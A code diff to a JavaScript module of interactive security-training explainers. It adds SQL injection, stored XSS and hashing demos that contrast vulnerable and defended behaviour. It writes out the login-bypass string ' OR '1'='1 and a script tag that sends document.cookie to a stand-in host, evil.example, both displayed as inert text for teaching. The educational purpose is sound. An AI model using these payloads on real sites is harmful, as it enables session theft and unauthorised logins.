@@ -7,7 +7,7 @@ const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": 
 const reduced = () => typeof matchMedia === "function" && matchMedia("(prefers-reduced-motion: reduce)").matches;
 
 // The explainers this module can draw. Keep in step with mount()'s switch and the shift JSON `seeItAtWork.kind`.
-export const KINDS = ["vpn", "idor", "cloud", "inbox-rule", "spray", "mfa-fatigue", "ddos", "cert", "chain", "zero-trust"];
+export const KINDS = ["vpn", "idor", "cloud", "inbox-rule", "spray", "mfa-fatigue", "ddos", "cert", "chain", "zero-trust", "sqli", "xss", "hashing"];
 
 // VPN full tunnel: the same employee, physically in the London office the whole time. With the VPN off the
 // website sees her real public address; with it on, all her traffic leaves through the company's VPN exit, so
@@ -34,6 +34,9 @@ export function mount(el, kind, opts = {}) {
   if (kind === "cert") return mountCert(el, opts);
   if (kind === "chain") return mountChain(el, opts);
   if (kind === "zero-trust") return mountZt(el, opts);
+  if (kind === "sqli") return mountSqli(el, opts);
+  if (kind === "xss") return mountXss(el, opts);
+  if (kind === "hashing") return mountHash(el, opts);
   el.innerHTML = `<p class="muted">No explainer for "${esc(kind)}".</p>`;
   return null;
 }
@@ -131,9 +134,9 @@ export const IDOR = {
     note: "The app checks the order belongs to you first, so walking the IDs gets nowhere." },
 };
 export function idorView(check) { return check ? IDOR.on : IDOR.off; }
-function mountIdor(el, { start = false } = {}) {
+function mountIdor(el, { start = false, head = true } = {}) {
   return toggle(el, {
-    cls: "xpl-idor", title: "How changing an order number leaks another customer's data", start,
+    cls: "xpl-idor", title: "How changing an order number leaks another customer's data", start, head,
     stage: `<div class="xpl-req"><span class="muted">Signed in as customer A · requesting</span>
         <div class="xpl-url mono">GET /account/orders/<b id="xpl-idor-id"></b></div></div>
       <div id="xpl-idor-resp"></div>`,
@@ -159,9 +162,9 @@ export const CLOUD = {
     note: "A least-privilege key only does the app's job, so the same leak gets nothing useful." },
 };
 export function cloudView(leastPriv) { return leastPriv ? CLOUD.on : CLOUD.off; }
-function mountCloud(el, { start = false } = {}) {
+function mountCloud(el, { start = false, head = true } = {}) {
   return toggle(el, {
-    cls: "xpl-cloud", title: "Why a leaked key does less harm when it's least privilege", start,
+    cls: "xpl-cloud", title: "Why a leaked key does less harm when it's least privilege", start, head,
     stage: `<div class="xpl-req"><span class="muted">Leaked app key · permissions</span>
         <div class="xpl-url mono" id="xpl-cloud-scope"></div>
         <span class="muted">used against bucket <b class="mono">${esc(CLOUD.bucket)}</b></span></div>
@@ -189,10 +192,10 @@ export const INBOX = {
     note: "Without the rule it lands in the Inbox, unread, where the owner would question the bank-change request." },
 };
 export function inboxView(ruleOn) { return ruleOn ? INBOX.on : INBOX.off; }
-function mountInbox(el, { start = false } = {}) {
+function mountInbox(el, { start = false, head = true } = {}) {
   const row = (m, extra = "") => `<li class="xpl-mail ${extra}"><b>${esc(m.from)}</b><span>${esc(m.subject)}</span></li>`;
   return toggle(el, {
-    cls: "xpl-inbox", title: "How a hidden inbox rule buries the mail that matters", start,
+    cls: "xpl-inbox", title: "How a hidden inbox rule buries the mail that matters", start, head,
     stage: `<div class="xpl-folder"><span class="eyebrow" id="xpl-inbox-folder"></span>
         <ul class="xpl-maillist" id="xpl-inbox-list"></ul></div>`,
     label: on => ({ btn: on ? "Turn the hidden rule off" : "Turn the hidden rule on",
@@ -385,5 +388,76 @@ function mountZt(el, opts = {}) {
       root.querySelector("#xpl-zt-resp").innerHTML = respCard(on, v.status, on ? "The file server checks the request and denies it if the device or identity fails." : "Inside the network counts as trusted, so the stolen session reaches the file server.");
       root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
     },
+  });
+}
+
+// SQL injection: the login password box contains  ' OR '1'='1  . With a string-built query the input becomes part
+// of the SQL and the WHERE always matches; a parameterised query sends it as data, so it is just a password that
+// never matches. Matches the web-sqli lesson and the sqli-log lab.
+export const SQLI = {
+  off: { query: "SELECT * FROM users WHERE name='admin' AND pass='' OR '1'='1'", status: "200 OK",
+    body: "Logged in as admin. '1'='1' is always true, so the WHERE matches every row.",
+    note: "The typed text is glued straight into the query, so it becomes part of the code." },
+  on: { query: "SELECT * FROM users WHERE name='admin' AND pass = ?      (? = the whole typed string)", status: "401 Unauthorized",
+    body: "Login fails. The whole input is treated as one password, which simply doesn't match.",
+    note: "A parameterised query sends the input as data, never as code, so injection can't change the query." },
+};
+export function sqliView(paramised) { return paramised ? SQLI.on : SQLI.off; }
+function mountSqli(el, opts = {}) {
+  return toggle(el, {
+    cls: "xpl-sqli", title: "SQL injection: input as code vs input as data", start: opts.start, head: opts.head,
+    stage: `<div class="xpl-req"><span class="muted">Login where the password box contains <span class="mono">' OR '1'='1</span></span>
+        <div class="xpl-url mono" id="xpl-sqli-q"></div></div><div id="xpl-sqli-resp"></div>`,
+    label: on => ({ btn: on ? "Turn parameterised queries off" : "Turn parameterised queries on",
+      state: on ? "Defence: parameterised query" : "Defence: none (string-built query)" }),
+    render: (on, root) => { const v = sqliView(on);
+      root.querySelector("#xpl-sqli-q").textContent = v.query;
+      root.querySelector("#xpl-sqli-resp").innerHTML = respCard(on, v.status, v.body);
+      root.querySelector("#xpl-cap").innerHTML = esc(v.note); },
+  });
+}
+
+// Stored XSS: a saved review/comment contains a <script> tag. Written into the page as raw HTML, the browser runs
+// it (and can steal a viewer's session cookie); escaped on output, the tag is shown as harmless text. Matches the
+// web-xss lesson and the xss-review lab.
+export const XSS = {
+  comment: "<script>fetch('//evil.example/c?='+document.cookie)</script>",
+  off: { status: "Runs as code", body: "Every viewer's browser runs the script, so an admin who opens the page has their session cookie sent to the attacker.",
+    note: "The comment is written into the page as HTML, so the browser treats the <script> as code." },
+  on: { status: "Shown as text", body: "The page prints the characters of the tag as harmless text. Nothing runs.",
+    note: "Escaping turns < > & into &lt; &gt; &amp;, so the browser shows the tag instead of running it." },
+};
+export function xssView(escaped) { return escaped ? XSS.on : XSS.off; }
+function mountXss(el, opts = {}) {
+  return toggle(el, {
+    cls: "xpl-xss", title: "Stored XSS: escaped output vs raw output", start: opts.start, head: opts.head,
+    stage: `<div class="xpl-req"><span class="muted">A review is saved containing a &lt;script&gt; tag</span>
+        <div class="xpl-url mono" id="xpl-xss-c"></div></div><div id="xpl-xss-resp"></div>`,
+    label: on => ({ btn: on ? "Turn output escaping off" : "Turn output escaping on",
+      state: on ? "Defence: output escaped" : "Defence: none (raw HTML)" }),
+    render: (on, root) => { const v = xssView(on);
+      root.querySelector("#xpl-xss-c").textContent = XSS.comment;
+      root.querySelector("#xpl-xss-resp").innerHTML = respCard(on, v.status, v.body);
+      root.querySelector("#xpl-cap").innerHTML = esc(v.note); },
+  });
+}
+
+// Hashing: pick an input and see its SHA-256. The same text always gives the same hash; a one-character change
+// gives a completely different one (the avalanche effect); and you can't work backwards. Real SHA-256 values.
+// Matches the encryption lesson and the hashing lab.
+export const HASHES = [
+  { key: "a", input: "password", hash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" },
+  { key: "b", input: "Password", hash: "e7cf3ef4f17c3999a94f2c6f612e8a888e5b1026878e4e19398b23bd38ec221a" },
+  { key: "c", input: "password1", hash: "0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e" },
+];
+export function hashView(key) { return HASHES.find(h => h.key === key) || HASHES[0]; }
+function mountHash(el, opts = {}) {
+  return selector(el, {
+    cls: "xpl-hash", title: "Hashing: same in, same out; one change, totally different", head: opts.head, start: opts.start,
+    options: HASHES.map(h => ({ key: h.key, label: h.input })),
+    foot: "SHA-256, shown in full. A real login also adds a random salt per user before hashing, so equal passwords still differ.",
+    render: (key, root) => { const v = hashView(key);
+      root.querySelector("#xpl-body").innerHTML = `<div class="xpl-req"><span class="muted">SHA-256 of <b class="mono">${esc(v.input)}</b></span><div class="xpl-url mono">${esc(v.hash)}</div></div>`;
+      root.querySelector("#xpl-cap").innerHTML = "The same text always gives the same hash, but changing one character changes all of it, and you can't work backwards from the hash to the text."; },
   });
 }
